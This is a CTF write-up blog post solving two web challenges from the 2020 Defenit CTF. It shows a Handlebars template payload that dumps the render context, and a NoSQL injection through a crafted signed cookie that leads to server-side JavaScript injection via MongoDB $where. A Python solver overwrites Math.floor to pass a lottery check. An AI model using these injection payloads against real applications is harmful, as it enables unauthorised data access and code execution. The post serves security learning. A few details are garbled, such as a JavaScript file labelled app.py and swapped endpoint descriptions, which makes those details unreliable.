---
id: writeup-of-2020-defenit-ctf-english-ver
title: 2020 Defenit CTF Writeup ([Web]BabyJS, Fortune Cookie) - [English]
publishedAt: 2020-06-08T02:56:10.000Z
tags: [CTF, Writeup, Web Security, Express, MongoDB, Handlebars, Python, JavaScript, NoSQL, Injection, SSJI]
---

Hi, I'm 8ayac🐝 This post is a writeup of the 2 challenges I solved in [2020 Defenit CTF](https://ctftime.org/event/1060).
The challenges I solved are "Fortune Cookies" and "BabyJS" in Web category.

In addition, the result was a total of 1053pts and was 55th out of 964 teams.

![The result of IPFactory](img/writeup-of-2020-defenit-ctf-english-ver/IPFactory_result.png?w=229&h=43)

日本語版は[こちら](http://caya8.hatenablog.com/entry/2020/06/07/181927)

## [Web 248pts] BabyJS (47/964 Solves)

### Problem

```txt
Description
    Render me If you can.

Server
    babyjs.ctf.defenit.kr

Attachments
    babyjs.tar.gz
```

### Problem app overview

When I extracted the problem file, I found the source code of the application and the Docker configuration file etc.
It was an app written using Express, and template engine is [Handlebars](https://handlebarsjs.com/).

```javascript
const express = require('express');
const path = require('path');
const crypto = require('crypto');
const fs = require('fs');
const app = express();

const SALT = crypto.randomBytes(64).toString('hex');
const FLAG = require('./config').FLAG;

app.set('view engine', 'html');
app.engine('html', require('hbs').__express);

if (!fs.existsSync(path.join('views', 'temp'))) {
    fs.mkdirSync(path.join('views', 'temp'));
}

app.use(express.urlencoded());
app.use((req, res, next) => {
    const { content } = req.body;

    req.userDir = crypto.createHash('md5').update(`${req.connection.remoteAddress}_${SALT}`).digest('hex');
    req.saveDir = path.join('views', 'temp', req.userDir);

    if (!fs.existsSync(req.saveDir)) {
        fs.mkdirSync(req.saveDir);
    }

    if (typeof content === 'string' && content.indexOf('FLAG') != -1 || typeof content === 'string' && content.length > 200) {
        res.end('Request blocked');
        return;
    }

    next();
});

app.get('/', (req, res) => {
    const { p } = req.query;
    if (!p) res.redirect('/?p=index');
    else res.render(p, { FLAG, 'apple': 'mint' });
});

app.post('/', (req, res) => {
    const { body: { content }, userDir, saveDir } = req;
    const filename = crypto.randomBytes(8).toString('hex');

    let p = path.join('temp', userDir, filename)

    fs.writeFile(`${path.join(saveDir, filename)}.html`, content, () => {
        res.redirect(`/?p=${p}`);
    })
});

app.listen(8080, '0.0.0.0');
```

Below is an overview of the features in the app.
See the source code for details.

- `GET /`: Display a page
  - Render the view specified by the GET parameter `p`
- `POST /`: Post some text
  - A file is created on the server whose content is the value of the POST parameter `content`.
    - After posting, if there is no problem (described later), you will be automatically redirected to `/?p={posted file path}`.
  - Create a file on the server whose content is the value of the POST parameter `content`.
  - After posting, if there is no problem (details will be described later), you will be automatically redirected to `/?p={posted file path}`.

### What is the final goal?

A variable `FLAG` is passed to view in the part commented with ★ in the following part.
I thought if I post a view that renders it properly I would get the flag.

```javascript
app.get('/', (req, res) => {
    const { p } = req.query;
    if (!p) res.redirect('/?p=index');
    else res.render(p, { FLAG, 'apple': 'mint' });  // ★
});
```

However, if you simply try to post a view written as `{{FLAG}}`, it will be blocked at the place marked with ① in the middleware like below.
Also, posts longer than 200 characters will be blocked.

```javascript
app.use((req, res, next) => {
    const { content } = req.body;

    req.userDir = crypto.createHash('md5').update(`${req.connection.remoteAddress}_${SALT}`).digest('hex');
    req.saveDir = path.join('views', 'temp', req.userDir);

    if (!fs.existsSync(req.saveDir)) {
        fs.mkdirSync(req.saveDir);
    }

    if (typeof content === 'string' && content.indexOf('FLAG') != -1 || typeof content === 'string' && content.length > 200) {  // ①
        res.end('Request blocked');
        return;
    }

    next();
});
```

It seems to be okay setting the final goal to post a view within 200 characters that does not include the character `FLAG`.

### Solution

Finally, referring to [this document](https://handlebarsjs.com/guide/builtin-helpers.html#each), I created the following payload.

```handlebars
{{#each this}}{{@key}} => {{this.toString}}<br>{{/each}}
```

When I actually posted it, the flag was displayed as follows.

![Got the flag of this problem](img/writeup-of-2020-defenit-ctf-english-ver/babyjs_got_the_flag.png?w=543&h=172)

#### Explanation of the payload

You can see `this` in the payload, and that is an object like below.
I used the Handlebars's Built-in Helper [#each](https://handlebarsjs.com/guide/builtin-helpers.html#each) to render all keys and values.toString() ​​of this object.

```txt
{
    settings: {
        'x-powered-by': true,
        etag: 'weak',
        'etag fn': [Function: generateETag],
        env: 'development',
        'query parser': 'extended',
        'query parser fn': [Function: parseExtendedQueryString],
        'subdomain offset': 2,
        'trust proxy': false,
        'trust proxy fn': [Function: trustNone],
        view: [Function: View],
        views: '/app/views',
        'jsonp callback name': 'callback',
        'view engine': 'html'
    },
    FLAG: 'Defenit{w3bd4v_0v3r_h7tp_n71m_0v3r_Sm8}',
    apple: 'mint',
    _locals: [Object: null prototype] {},
    cache: false
}
```

### Flag

`Defenit{w3bd4v_0v3r_h7tp_n71m_0v3r_Sm8}`

## [Web 507pts] Fortune Cookie (15/964 Solves)

### Problem

```txt
Description
    Here's a test of luck!
    What's your fortune today?

Server
    fortune-cookie.ctf.defenit.kr

Attachments
    fortune-cookie.tar.gz
```

### Problem app overview

When I extracted the problem file, I found the source code of the application and the Docker configuration file etc.
Apparently it's an Express + MongoDB app.

The source code of the application (`data/node/app.py`) is as follows.

```javascript
const express = require('express');
const cookieParser = require('cookie-parser');
const { MongoClient, ObjectID } = require('mongodb');
const { FLAG, MONGO_URL } = require('./config');

const app = express();

app.set('view engine', 'html');
app.engine('html', require('ejs').renderFile);

app.use(cookieParser('🐈' + '🐇'));
app.use(express.urlencoded());


app.get('/', (req, res) => {
    res.render('index', { session: req.signedCookies.user });
});

app.get('/login', (req, res) => {
    res.render('login');
});

app.post('/login', (req, res) => {
    let { username } = req.body;

    res.cookie('user', username, { signed: true });
    res.redirect('/');
});

app.use((req, res, next) => {
    if (!req.signedCookies.user) {
        res.redirect('/login');
    } else {
        next();
    }
});

app.get('/logout', (req, res) => {
    res.clearCookie('user');
    res.redirect('/');
});

app.get('/write', (req, res) => {
    res.render('write');
});

app.post('/write', (req, res) => {

    const client = new MongoClient(MONGO_URL, { useNewUrlParser: true });
    const author = req.signedCookies.user;

    const { content } = req.body;

    client.connect(function (err) {

        if (err) throw err;

        const db = client.db('fortuneCookie');
        const collection = db.collection('posts');

        collection
            .insertOne({
                author,
                content
            })
            .then((result) => {
                res.redirect(`/view?id=${result.ops[0]._id}`)
            }
            );

        client.close();

    });

});

app.get('/view', (req, res) => {

    const client = new MongoClient(MONGO_URL, { useNewUrlParser: true });
    const author = req.signedCookies.user;
    const { id } = req.query;

    client.connect(function (err) {

        if (err) throw err;

        const db = client.db('fortuneCookie');
        const collection = db.collection('posts');

        try {
            collection
                .findOne({
                    _id: ObjectID(id)
                })
                .then((result) => {

                    if (result && typeof result.content === 'string' && author === result.author) res.render('view', { content: result.content })
                    else res.end('Invalid or not allowed');

                }
                );
        } catch (e) { res.end('Invalid request') } finally {
            client.close();
        }


    });
});

app.get('/posts', (req, res) => {

    let client = new MongoClient(MONGO_URL, { useNewUrlParser: true });
    let author = req.signedCookies.user;

    if (typeof author === 'string') {
        author = { author };
    }

    client.connect(function (err) {

        if (err) throw err;

        const db = client.db('fortuneCookie');
        const collection = db.collection('posts');

        collection
            .find(author)
            .toArray()
            .then((posts) => {
                res.render('posts', { posts })
            }
            );

        client.close();

    });

});

app.get('/flag', (req, res) => {

    let { favoriteNumber } = req.query;
    favoriteNumber = ~~favoriteNumber;

    if (!favoriteNumber) {
        res.send('Please Input your <a href="?favoriteNumber=1337">favorite number</a> 😊');
    } else {

        const client = new MongoClient(MONGO_URL, { useNewUrlParser: true });

        client.connect(function (err) {

            if (err) throw err;

            const db = client.db('fortuneCookie');
            const collection = db.collection('posts');

            collection.findOne({ $where: `Math.floor(Math.random() * 0xdeaaaadbeef) === ${favoriteNumber}` })
                .then(result => {
                    if (favoriteNumber > 0x1337 && result) res.end(FLAG);
                    else res.end('Number not matches. Next chance, please!')
                });

            client.close();

        });
    }
})

app.listen(8080, '0.0.0.0');
```

Below is an overview of the features in the app.
See the source code for details.

- `GET /`: Top page
  - Authenticated users → list of features
  - Not authenticated users → link to /login
- `GET /login`: Login page
- `POST /login`: Do login
  - Set a signed cookie `user`
- `GET /logout`: Do logout
  - Discard the set cookie
- `POST /write`: Post some text
- `GET /view`: List posted text
  - You can see all ObjectIds of the documents posted by yourself.
- `GET /posts`: Browse contents of the documents
  - You can see the contents of your post by specifying the ObjectId.
  - Can't see other user's.
- `GET /flag`: Lottery
  - Lucky man will get the flag.
  - Details will be described later

### What is the final goal?

First of all, start to analyze the app to find out what I should do.
There is an endpoint `/flag`, so let's start from here.

```javascript
app.get('/flag', (req, res) => {

    let { favoriteNumber } = req.query;
    favoriteNumber = ~~favoriteNumber;

    if (!favoriteNumber) {
        res.send('Please Input your <a href="?favoriteNumber=1337">favorite number</a> 😊');
    } else {

        const client = new MongoClient(MONGO_URL, { useNewUrlParser: true });

        client.connect(function (err) {

            if (err) throw err;

            const db = client.db('fortuneCookie');
            const collection = db.collection('posts');

            collection.findOne({ $where: `Math.floor(Math.random() * 0xdeaaaadbeef) === ${favoriteNumber}` })
                .then(result => {
                    if (favoriteNumber > 0x1337 && result) res.end(FLAG);   // ★
                    else res.end('Number not matches. Next chance, please!')
                });

            client.close();

        });
    }
})
```

If you get to the line in the code marked with ★, you can read the Flag.
Also, if you read the code purely, you will find that you need to meet all the following conditions to actually get there.

- GET parameter `favoriteNumber` meets `!~~favoriteNumber == True`.
  - [What is `~~`](https://stackoverflow.com/questions/5971645/what-is-the-double-tilde-operator-in-javascript)
  - Because of this condition, some strings are ineligible as the value of `favoriteNumber`.
- Specify GET parameter `favoriteNumber` that makes ``` `Math.floor(Math.random() * 0xdeaaaadbeef) === ${favoriteNumber}` ``` passed as the condition of `collection.findOne()` be True.
- GET parameter `favoriteNumber` meets  `(Math.floor(Math.random() * 0xdeaaaadbeef) === ${favoriteNumber}) == True`を満たす
  - `Math.floor(Math.random() * 0xdeaaaadbeef` is the condition passed to `collection.findOne()` as argument.
- GET parameter `favoriteNumber` is greater than 0x1337.
- There is at least one document in the `posts` collection.

In practice, the value of `Math.floor(Math.random() * 0xdeaaaadbeef)` will be huge, so unless you are a extremely lucky person, it's not a good idea to challenge the lottery.
For the time being, I set the final goal to break this condition by some other approach.

### Consider likely approaches

Now, let's consider a approach to pass the lottery.

First, I considered the vulnerabilities likely to use.
The app uses MongoDB, so I suspected NoSQL Injection.
Also, even if you look at the configuration file, it seems that you can chain to SSJI from NoSQL injection.
If you can do SSJI and rewrite the contents of `Math.floor()` into a function that returns a fixed value, you can easily pass the test.

### Find NoSQL Injection

Okay, let's find NoSQL Injection.

Found it.

```javascript
app.post('/login', (req, res) => {
    let { username } = req.body; // ①

    res.cookie('user', username, { signed: true });
    res.redirect('/');
});

︙

app.get('/posts', (req, res) => {

    let client = new MongoClient(MONGO_URL, { useNewUrlParser: true });
    let author = req.signedCookies.user; // ②

    if (typeof author === 'string') {
        author = { author }; // ③
    }

    client.connect(function (err) {

        if (err) throw err;

        const db = client.db('fortuneCookie');
        const collection = db.collection('posts');

        collection
            .find(author) // ④
            .toArray()
            .then((posts) => {
                res.render('posts', { posts })
            }
            );

        client.close();

    });

});
```

#### Explanation

The basic request for `POST /login` looks like this:

```http
POST /login HTTP/1.1
Host: fortune-cookie.ctf.defenit.kr
Content-Length: 16
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
Origin: http://fortune-cookie.ctf.defenit.kr
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://fortune-cookie.ctf.defenit.kr
Accept-Encoding: gzip, deflate
Accept-Language: ja,en-US;q=0.9,en;q=0.8,zh-CN;q=0.7,zh;q=0.6
Connection: close

username=8ayac
```

When you send it, the value of `req.body` becomes `{ username: '8ayac' }` (in the line with the comment ①) and the value `8ayac` corresponding to this object `username` key will be set as the variable `username`.
And the signed cookie `user` holds the value `8ayac`.
This cookie will be set in the response and the authenticated users will use it from then on.

Below is the actual response.

```http
HTTP/1.1 302 Found
Server: nginx/1.14.0 (Ubuntu)
Date: Sun, 07 Jun 2020 01:01:54 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 46
Connection: close
X-Powered-By: Express
Set-Cookie: user=s%3A8ayac.u%2B5zh6Yd%2Fw28iIedhUa9yRii9zcX4thK7%2FANBXHDhXs; Path=/
Location: /
Vary: Accept

<p>Found. Redirecting to <a href="/">/</a></p>
```

Within `POST /posts`, the set cookies are normally used in the following order.

1. It is assigned to the variable `author` (in the line marked with ②)
2. Converted to an object (in the line marked with ③)
3. Used as a query selector for `find()` (in the line marked with ④)

For example, suppose the cookie value is `8ayac`.
This value is converted to an object called `{"author": "8ayac"}` in ③, and finally a query is issued so that the document whose `author` is `8ayac` is retrieved.

There is a vulnerability here.
If the object is set in the cookie, you can freely manipulate the conditions passed to the find query.

For example, suppose the cookie value is `{content:{'$regex':'.*'}}`.
This object will be used in ④ directly after being assigned to the variable `author` in ②.
As a result, a query will be issued that retrieves documents whose `content` matches the regular expression `.*`.

If you want to set a value like that into a cookie in practice, send a request like bellow:
With an appropriately customized payload, you can set any object to a cookie value.

```http
POST /login HTTP/1.1
Host: fortune-cookie.ctf.defenit.kr
Content-Length: 14
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
Origin: http://fortune-cookie.ctf.defenit.kr
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://fortune-cookie.ctf.defenit.kr/login
Accept-Encoding: gzip, deflate
Accept-Language: ja,en-US;q=0.9,en;q=0.8,zh-CN;q=0.7,zh;q=0.6
Connection: close

username[content][$regex]=.*
```

### Upgrade to SSJI

MongoDB has some features that perform server-side execution of JavaScript code.
The `$where` operator is one of them.
For more information, please see <https://docs.mongodb.com/manual/core/server-side-javascript/>.

> $where operator that evaluates a JavaScript expression or a function in order to query for documents.

Below you can see that the `eval` function in the `$where` condition has been actually performed.

```shell-session
root@5895c47e40e5:/# mongo -u redacted -p redacted
MongoDB shell version v4.2.7
(snip)
> use fortuneCookie
switched to db fortuneCookie
> db.posts.find({ $where: "eval(1+1) == 1" })
> db.posts.find({ $where: "eval(1+1) == 2" })
{ "_id" : ObjectId("5edc178c9ee53600459bd3b0"), "author" : "8ayac", "content" : "hoge" }
{ "_id" : ObjectId("5edc373b9ee53600459bd3b1"), "author" : "8ayac", "content" : "fuga" }
```

At last, let's make payload to rewrite `Math.floor` function well.

### Solver

I wrote a solver like below:

```python
#!/usr/bin/env python3
import requests


"""
Constants
"""
URL = 'http://fortune-cookie.ctf.defenit.kr'
N = 588488491  # Large enough to prevent accidents in a shared environment


"""
Exploit
"""
s = requests.Session()

payload = f"Math.floor = this.constructor.constructor('return {N}'); return 0"
s.post(f'{URL}/login', data={"username[$where]": payload})
s.get(f'{URL}/posts')

flag = s.get(f'{URL}/flag', params={'favoriteNumber': N}).text
print(f'{flag=}')
```

Executed it, then I got the flag.
Yay!

```shell-session
$ python3 solver.py
flag='Defenit{c0n9r47ula7i0n5_0n_y0u2_9o0d_f02tun3_haHa}'
```

### Flag

`Defenit{c0n9r47ula7i0n5_0n_y0u2_9o0d_f02tun3_haHa}`

## Thoughts(?)

I really enjoyed the challenges!
Thank you Defenit CTF.

## Inquiry

If you have any questions or suggestions regarding this article, please contact [8ayac](https://twitter.com/8ayac).
In addition, since I am studying English, I would be happy if you could tell me about my strange English expressions.

Thanks!
